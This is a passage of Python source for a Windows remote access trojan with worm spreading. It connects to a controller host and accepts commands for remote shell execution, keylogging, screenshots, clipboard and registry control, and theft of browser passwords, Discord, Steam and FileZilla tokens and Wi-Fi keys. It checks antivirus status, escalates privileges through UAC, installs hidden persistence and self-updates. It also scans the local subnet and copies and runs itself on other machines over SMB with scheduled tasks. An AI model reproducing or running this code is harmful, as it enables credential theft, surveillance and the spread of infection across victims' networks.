                "path": self_path(), "admin": is_admin(), "pid": os.getpid(),
                "ip": local_ip(), "uptime": uptime(), "crypto": "sha256ctr+hmac",
                "defender": "RUNNING" if "RUNNING" in sh("sc query WinDefend", timeout=15)[1] else "?"}

    # ------------------------------------------------------------ LAN worm ---
    def _sweep(self):
        ip = local_ip(); base = ".".join(ip.split(".")[:3])
        live, lock = [], threading.Lock()
        def probe(n):
            h = f"{base}.{n}"
            if h == ip: return
            for p in CFG.get("spread_ports", [445]):
                s = socket.socket(); s.settimeout(0.35)
                try:
                    if s.connect_ex((h, p)) == 0:
                        with lock: live.append(h); return
                finally: s.close()
        th = [threading.Thread(target=probe, args=(n,), daemon=True) for n in range(1, 255)]
        [t.start() for t in th]; [t.join(4) for t in th]
        return sorted(live, key=lambda z: int(z.split(".")[-1]))

    def _payload(self):
        if FROZEN: return [(sys.executable, TAG + ".exe")], f"{{d}}\\{TAG}.exe"
        exe = BIN
        if not os.path.exists(exe) and ORIG_DIR:
            c = os.path.join(ORIG_DIR, "pythonw.exe")
            if os.path.exists(c): exe = c
        files = [(exe, TAG + ".exe"), (PY, TAG + EXT)]
        for f in os.listdir(WDIR):
            if f.lower().endswith(".dll"): files.append((os.path.join(WDIR, f), f))
        return files, f'{{d}}\\{TAG}.exe" "{{d}}\\{TAG}{EXT}'

    def _stage(self, host):
        files, launch = self._payload()
        for tmpl in CFG.get("spread_dirs", []):
            dest = f"\\\\{host}\\{tmpl}"
            try:
                os.makedirs(dest, exist_ok=True)
                for src, name in files: shutil.copy2(src, os.path.join(dest, name))
                return dest, launch.replace("{d}", dest)
            except OSError: continue
        return None, None

    def _cim(self, host, u, p, launch):
        cred = (f'$pw=ConvertTo-SecureString "{p}" -AsPlainText -Force;'
                f'$cr=New-Object System.Management.Automation.PSCredential("{u}",$pw);') if u else ""
        cs = f"New-CimSession -ComputerName {host}" + (" -Credential $cr" if u else "")
        c = (f'{cred}$s={cs};Invoke-CimMethod -CimSession $s -ClassName Win32_Process '
             f'-MethodName Create -Arguments @{{CommandLine="{launch}"}} | Out-Null')
        return sh(f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{c}"', timeout=90)[0] == 0

    def _infect(self, host, cred):
        if cred:
            u, _, p = cred.partition(":")
            if sh(f'net use \\\\{host}\\IPC$ /user:"{u}" "{p}"', timeout=25)[0] != 0: return False
        if sh(f'dir \\\\{host}\\C$', timeout=25)[0] != 0: return False
        dest, launch = self._stage(host)
        if not dest: return False
        u, _, p = (cred or "").partition(":")
        auth = f' /u "{u}" /p "{p}"' if u else ""
        if sh(f'schtasks /create /s {host}{auth} /tn "{TAG}" /tr "{launch}" '
              f'/sc onlogon /rl highest /f', timeout=40)[0] == 0:
            sh(f'schtasks /run /s {host}{auth} /tn "{TAG}"', timeout=40)
            return True
        return self._cim(host, u, p, launch)

    def c_spread(self, a, x):
        hosts = a.get("hosts") or self._sweep()
        creds = a.get("creds") or CFG.get("spread_creds") or [""]
        hit, miss = [], []
        for h in hosts:
            if sh(f'schtasks /query /s {h} /tn "{TAG}"', timeout=15)[0] == 0: continue
            for c in creds:
                if self._infect(h, c): hit.append(h); break
            else: miss.append(h)
        return {"scanned": len(hosts), "infected": hit, "failed": miss}

    def c_freeze(self, a, x):
        r = {"deep_freeze_proc": "DFServ" in sh('tasklist /fi "imagename eq DFServ.exe" /nh')[1]}
        r["filter_drivers"] = [l.split(",")[0].strip('"') for l in
                               sh("driverquery /fo csv /nh")[1].splitlines()
                               if any(k in l.lower() for k in ("deepfrz", "dfx", "rbrx", "shadow"))][:6]
        r["writable_volumes"] = []
        for L in "DEFGH":
            try:
                t = f"{L}:\\.px_test"; open(t, "w").write("x"); os.remove(t)
                r["writable_volumes"].append(f"{L}:\\")
            except OSError: pass
        r["roaming_profile"] = os.environ.get("APPDATA", "").startswith("\\\\")
        return r

    # ---- basic
    def c_ping(self, a, x):        return "pong"
    def c_info(self, a, x):        return self.hello()
    def c_stat(self, a, x):        return telemetry()
    def c_shell(self, a, x):
        if a.get("cwd"): self.cwd = a["cwd"]
        rc, out = sh(a.get("cmd", ""), cwd=self.cwd)
        return {"rc": rc, "out": out[:600000]}
    def c_powershell(self, a, x):  return {"out": ps(a.get("cmd", "Get-Date"), timeout=300)}
    def c_ps(self, a, x):
        _, out = sh("tasklist /fo csv /nh", timeout=40); r = []
        for l in out.splitlines():
            p = [c.strip().strip('"') for c in l.split('","')]
            if len(p) >= 5:
                try: r.append({"name": p[0], "pid": int(p[1]), "sess": p[2], "mem": p[4]})
                except ValueError: pass
        return sorted(r, key=lambda z: z["name"].lower())
    def c_kill(self, a, x):        return sh(f'taskkill /F /PID {int(a["pid"])}')[1]
    def c_start(self, a, x):
        p = a["path"]
        subprocess.Popen(f'"{p}"' if " " in p else p, shell=True,
                         creationflags=DETACH | NOWIN, close_fds=True)
        return f"launched {p}"

    # ---- files
    def c_ls(self, a, x):
        path = a.get("path") or self.cwd; rows = []
        for n in sorted(os.listdir(path), key=str.lower):
            fp = os.path.join(path, n)
            try:
                st = os.stat(fp)
                rows.append({"name": n, "dir": os.path.isdir(fp),
                             "size": 0 if os.path.isdir(fp) else st.st_size, "mtime": int(st.st_mtime)})
            except OSError: rows.append({"name": n, "dir": False, "size": -1, "mtime": 0})
        return {"path": path, "entries": rows}
    def c_cd(self, a, x):
        p = os.path.abspath(os.path.join(self.cwd, a["path"]))
        if os.path.isdir(p): self.cwd = p
        return self.cwd
    def c_pwd(self, a, x):         return self.cwd
    def c_cat(self, a, x):
        return decode(open(os.path.join(self.cwd, a["path"]), "rb").read(int(a.get("limit", 400000))))
    def c_get(self, a, x):
        p = a["path"] if os.path.isabs(a["path"]) else os.path.join(self.cwd, a["path"])
        name, data = os.path.basename(p), open(p, "rb").read()
        CH = 512 * 1024; tot = max(1, (len(data) + CH - 1) // CH)
        for i in range(tot):
            self.send({"ev": "chunk", "xid": x, "name": name, "seq": i, "total": tot,
                       "data": base64.b64encode(data[i*CH:(i+1)*CH]).decode()})
        return {"name": name, "size": len(data), "chunks": tot}
    def c_put_start(self, a, x):
        self.put = {"path": a["path"], "tmp": a["path"] + ".pxpart"}
        self.put["fh"] = open(self.put["tmp"], "wb"); return NO_REPLY
    def c_put_chunk(self, a, x):
        self.put["fh"].write(base64.b64decode(a["data"])); return NO_REPLY
    def c_put_end(self, a, x):
        self.put["fh"].close()
        if os.path.exists(self.put["path"]):
            try: os.remove(self.put["path"])
            except OSError: pass
        shutil.move(self.put["tmp"], self.put["path"]); n = os.path.getsize(self.put["path"])
        self.put = None; return f"wrote {n} bytes"
    def c_rm(self, a, x):
        p = os.path.join(self.cwd, a["path"])
        shutil.rmtree(p, ignore_errors=True) if os.path.isdir(p) else os.remove(p)
        return "removed"
    def c_mkdir(self, a, x):
        os.makedirs(os.path.join(self.cwd, a["path"]), exist_ok=True); return "ok"
    def c_mv(self, a, x):
        shutil.move(os.path.join(self.cwd, a["src"]), os.path.join(self.cwd, a["dst"])); return "ok"
    def c_find(self, a, x):
        pat, root, hits = a["pattern"].lower(), a.get("root", "C:\\"), []
        cap = int(a.get("limit", 300))
        for dp, dn, fn in os.walk(root):
            for n in fn + dn:
                if pat in n.lower():
                    hits.append(os.path.join(dp, n))
                    if len(hits) >= cap: return hits
        return hits
    def c_drives(self, a, x):
        out = []
        for L in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            d = f"{L}:\\"
            if os.path.exists(d):
                u = shutil.disk_usage(d)
                out.append({"drive": d, "total_gb": round(u[0]/2**30, 1), "free_gb": round(u[2]/2**30, 1)})
        return out
    def c_env(self, a, x):         return dict(os.environ)

    # ---- control
    def c_power(self, a, x):
        t = {"off": "shutdown /s /t 3 /f", "restart": "shutdown /r /t 3 /f",
             "logoff": "shutdown /l /f", "hibernate": "shutdown /h",
             "sleep": "rundll32 powrprof.dll,SetSuspendState 0,1,0",
             "lock": "rundll32 user32.dll,LockWorkStation"}
        m = a["mode"].lower()
        if m not in t: return "modes: " + ", ".join(t)
        subprocess.Popen(t[m], shell=True, creationflags=DETACH | NOWIN); return f"{m} issued"
    def c_screen(self, a, x):      return {"png": base64.b64encode(screenshot_png()).decode()}
    def c_msg(self, a, x):
        threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(
            0, a.get("text", "hi"), a.get("title", TAG), 0x40 | 0x1000), daemon=True).start()
        return "shown"
    def c_blackout(self, a, x):    return px_blackout(a)
    def c_corrupt(self, a, x):     return px_corrupt(a)
    def c_clip(self, a, x):
        if a.get("set") is not None: self.set_clip(a["set"]); return "set"
        return clipboard()
    def set_clip(self, text):
        u, k = ctypes.windll.user32, ctypes.windll.kernel32
        if not u.OpenClipboard(0): return
        u.EmptyClipboard()
        b = ctypes.create_unicode_buffer(text)
        u.SetClipboardData(13, ctypes.cast(b, ctypes.c_void_p))
        k.GlobalUnlock(ctypes.cast(b, ctypes.c_void_p))
        u.CloseClipboard()
    def c_reg(self, a, x):
        import winreg
        hive = {"HKCU": winreg.HKEY_CURRENT_USER, "HKLM": winreg.HKEY_LOCAL_MACHINE}.get(
            a.get("hive", "HKCU").upper())
        op, path, name = a.get("op", "get"), a.get("path", ""), a.get("name", "")
        if op == "get":
            with winreg.OpenKey(hive, path) as k:
                if name: return {"value": winreg.QueryValueEx(k, name)[0]}
                o, i = {}, 0
                while True:
                    try:
                        n, v, _ = winreg.EnumValue(k, i); o[n] = v; i += 1
                    except OSError: break
                return o
        if op == "set":
            T = {"REG_SZ": winreg.REG_SZ, "REG_DWORD": winreg.REG_DWORD,
                 "REG_EXPAND_SZ": winreg.REG_EXPAND_SZ, "REG_BINARY": winreg.REG_BINARY}
            v = int(a["value"]) if a.get("type") == "REG_DWORD" else a.get("value")
            with winreg.CreateKeyEx(hive, path, 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, name, 0, T.get(a.get("type", "REG_SZ"), winreg.REG_SZ), v)
            return "set"
        with winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, name)
        return "deleted"
    def c_keylog(self, a, x):
        op = a.get("op", "dump")
        if op == "start":
            if not self.klog_on:
                self.klog_on = True
                threading.Thread(target=self._kloop, daemon=True).start()
            return "started"
        if op == "stop":  self.klog_on = False; return "stopped"
        if op == "clear": self.klog = []; return "cleared"
        return "".join(self.klog[-8000:])
    def _kloop(self):
        u = ctypes.windll.user32
        while self.klog_on:
            for vk, nm in VK.items():
                if u.GetAsyncKeyState(vk) & 0x8000:
                    if not self.kdown.get(vk): self.kdown[vk] = True; self.klog.append(nm)
                else: self.kdown[vk] = False
            time.sleep(0.02)
    def c_net(self, a, x):         return sh(a.get("cmd", "netstat -ano"))[1][:200000]
    def c_wifi(self, a, x):
        out = sh("netsh wlan show profiles")[1]
        names = [l.split(":", 1)[1].strip() for l in out.splitlines() if "Profile" in l and ":" in l]
        r = []
        for n in names:
            d = sh(f'netsh wlan show profile name="{n}" key=clear')[1]
            r.append({"ssid": n, "key": next((l.split(":", 1)[1].strip()
                       for l in d.splitlines() if "Key Content" in l), "")})
        return r
    def c_av(self, a, x):
        return {"realtime": ps("(Get-MpComputerStatus).RealTimeProtectionEnabled"),
                "exclusions": ps("(Get-MpPreference).ExclusionPath"),
                "threats": ps("Get-MpThreatDetection | Select-Object -Last 5 | % { $_.Resources }"),
                "other_av": ps("Get-CimInstance -Namespace root/SecurityCenter2 -ClassName "
                               "AntiVirusProduct | Select-Object -Expand displayName")}
    def c_elevate(self, a, x):
        if is_admin(): return "already elevated"
        ctypes.windll.shell32.ShellExecuteW(None, "runas", self_path(),
                                            "" if FROZEN else f'"{SELF}"', None, 1)
        return "UAC raised - a second elevated agent will connect"
    def c_persist(self, a, x):
        if a.get("op", "on") == "on": persist(); return "persistence armed"
        unpersist(); return "persistence removed"
    def c_where(self, a, x):
        return {"script": PY, "exe": BIN, "dir": WDIR, "runkey": runkey_ok(),
                "pid": os.getpid(), "exe_name": os.path.basename(self_path()),
                "watchdog": proc_alive(read_pid(WDOGF)), "admin": is_admin(),
                "crypto": "sha256-ctr+hmac-sha256", "frozen": FROZEN}

    def c_harvest(self, a, x):
        what = a.get("what", "all")
        r = {"agent": self.id, "host": socket.gethostname(), "when": int(time.time())}
        if what in ("all", "browsers"): r["passwords"] = harvest_passwords()
        if what in ("all", "tokens"):
            r["discord"] = harvest_discord(); r["steam"] = harvest_steam()
            r["filezilla"] = harvest_filezilla(); r["files"] = harvest_files()
        if what == "all":
            r["wifi"] = self.c_wifi({}, x)
            r["cmdkey"] = sh("cmdkey /list")[1][:4000]
            r["crypto_selftest"] = crypto_selftest()
        return r

    def c_update(self, a, x):
        self.upd, self.upd_ev = None, threading.Event()
        self.send({"ev": "want_update", "ext": EXT, "frozen": FROZEN})
        if not self.upd_ev.wait(180): return "controller has no payload"
        f = self.upd
        if f.get("error"): return f["error"]
        data = base64.b64decode(f["data"])
        if hashlib.sha256(data).hexdigest() != f.get("sha256"): return "hash mismatch"
        if FROZEN:
            new = os.path.join(WDIR, TAG + ".new")
            open(new, "wb").write(data)
            body = f'del /f /q "{self_path()}"\nmove /y "{new}" "{self_path()}"\n'
        else:
            open(PY, "wb").write(data); body = ""
        bat = os.path.join(WDIR, "px_upd.cmd")
        open(bat, "w").write("@echo off\nping -n 3 127.0.0.1 >nul\n" + body
                             + f'start "" {launch_line()}{" --run" if RUN_MODE else ""}\n'
                             + 'del /f /q "%~f0"\n')
        subprocess.Popen(["cmd", "/c", bat], creationflags=DETACH | NOWIN, close_fds=True)
        threading.Timer(0.6, lambda: os._exit(0)).start()
        return f"update applied ({len(data)} bytes) - restarting"

    def c_nuke(self, a, x):
        creds = CFG.get("spread_creds") or [""]
        hosts = a.get("hosts") or self._sweep()
        cleaned, missed = [], []
        for h in hosts:
            if sh(f'schtasks /query /s {h} /tn "{TAG}"', timeout=12)[0] != 0: continue
            for c in creds:
                u, _, p = c.partition(":")
                auth = f' /u "{u}" /p "{p}"' if u else ""
                if u: sh(f'net use \\\\{h}\\IPC$ /user:"{u}" "{p}"', timeout=20)
                sh(f'taskkill /s {h}{auth} /f /im {TAG}.exe', timeout=25)
                if sh(f'schtasks /delete /s {h}{auth} /tn "{TAG}" /f', timeout=25)[0] == 0:
                    for tmpl in CFG.get("spread_dirs", []):
                        sh(f'rmdir /s /q "\\\\{h}\\{tmpl}"', timeout=25)
                    cleaned.append(h); break
            else: missed.append(h)
        unpersist()
        ids = ps("$ErrorActionPreference='SilentlyContinue'; Get-Process | % { "
                 f"if ($_.Path -like '{WDIR}*') {{ $_.Id }} }}").split()
        me = os.getpid()
        kill = " & ".join(f"taskkill /f /pid {q} >nul 2>&1" for q in ids if q.isdigit() and int(q) != me)
        cmd = "cmd /c ping -n 4 127.0.0.1 >nul"
        if kill: cmd += " & " + kill
        cmd += f' & rmdir /s /q "{WDIR}"'
        self.reply(x, {"cleaned": cleaned, "missed": missed, "local_dir": WDIR})
        subprocess.Popen(cmd, shell=True, creationflags=DETACH | NOWIN)
        threading.Timer(1.0, lambda: os._exit(0)).start()
        return NO_REPLY

    def c_uninstall(self, a, x):
        unpersist()
        if not a.get("keep"):
            subprocess.Popen(f'cmd /c ping -n 3 127.0.0.1 >nul & rmdir /s /q "{WDIR}"',
                             shell=True, creationflags=DETACH | NOWIN)
        self.reply(x, "uninstalled"); threading.Timer(0.5, lambda: os._exit(0)).start()
        return NO_REPLY
    def c_exit(self, a, x):
        self.reply(x, "bye"); threading.Timer(0.4, lambda: os._exit(0)).start(); return NO_REPLY

    SYNC = {"put_start", "put_chunk", "put_end"}

    def dispatch(self, f):
        cmd, x, args = f.get("cmd"), f.get("xid"), f.get("args") or {}
        fn = getattr(self, "c_" + cmd, None)
        if not fn: return self.reply(x, e=f"unknown '{cmd}'")
        try:
            r = fn(args, x)
            if r is not NO_REPLY: self.reply(x, d=r)
        except Exception as e:
            self.reply(x, e=f"{type(e).__name__}: {e}")

    def serve(self):
        while True:
            f = self.recv()
            ev = f.get("ev")
            if ev == "ping": self.send({"ev": "pong"})
            elif ev == "pong": pass
            elif ev == "update": self.upd = f; self.upd_ev.set()
            elif ev == "req":
                if f.get("cmd") in self.SYNC: self.dispatch(f)
                else:
                    with self.sem:
                        threading.Thread(target=self.dispatch, args=(f,), daemon=True).start()

    def _telemetry_loop(self):
        iv = CFG.get("telemetry", 20)
        if not iv: return
        while True:
            time.sleep(iv)
            try: self.send({"ev": "evt", "k": "stat", "d": telemetry()})
            except Exception: pass

    def run(self):
        write_pid(PIDF)
        threading.Thread(target=self._telemetry_loop, daemon=True).start()
        back = 3
        while True:
            try:
                s = socket.create_connection((CFG["host"], CFG["port"]), timeout=15)
                if CFG["tls"]:
                    import ssl
                    c = ssl.create_default_context(); c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
                    s = c.wrap_socket(s, server_hostname=CFG["host"])
                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1); s.settimeout(120)
                self.sock = s
                self.send({"ev": "hello", "id": self.id, "tag": TAG, "proto": 1, "info": self.hello()})
                if not self.recv().get("ok"): time.sleep(10); continue
                back = 3
                self.serve()
            except Exception:
                pass
            time.sleep(back + (back * 0.5) * (0.5 - os.urandom(1)[0] / 255))
            back = min(back * 2, 90)


# ============================================================================
#  MAIN
# ============================================================================
def check():
    print(f"version   : 4.0")
    print(f"entry     : {self_path()}")
    print(f"workdir   : {WDIR}")
    print(f"admin     : {is_admin()}")
    print(f"crypto    : sha256-ctr + hmac-sha256 (pbkdf2 x{CFG['kdf_iters']})")
    print(f"aes-gcm   : {'OK' if crypto_selftest() else 'BROKEN'}")
    print(f"runkey    : {runkey_ok()}")
    print(f"watchdog  : {proc_alive(read_pid(WDOGF))}")
    for p in (PY, BIN, VBS):
        print(f"{'OK  ' if os.path.exists(p) else 'MISS'} {p}")

def main():
    argv = sys.argv[1:]
    if "--watchdog" in argv: return watchdog_main()
    if "--check" in argv: check(); return 0
    if "--install" in argv: persist(); print("persistence installed"); return 0
    if "--uninstall" in argv: unpersist(); print("persistence removed"); return 0

    if not RUN_MODE and relocate(): os._exit(0)
    if not single_instance(): os._exit(0)
    auto_elevate()
    persist()
    hide(WDIR); hide(PIDF)
    threading.Thread(target=watchdog, daemon=True).start()
    spawn_watchdog()
    ag = Agent()
    if CFG.get("spread"):
        threading.Thread(target=spreader, args=(ag,), daemon=True).start()
    ag.run()
    return 0


def uptime():
    try: return ctypes.windll.kernel32.GetTickCount64() // 1000
    except Exception: return 0


if __name__ == "__main__":
    sys.exit(main())
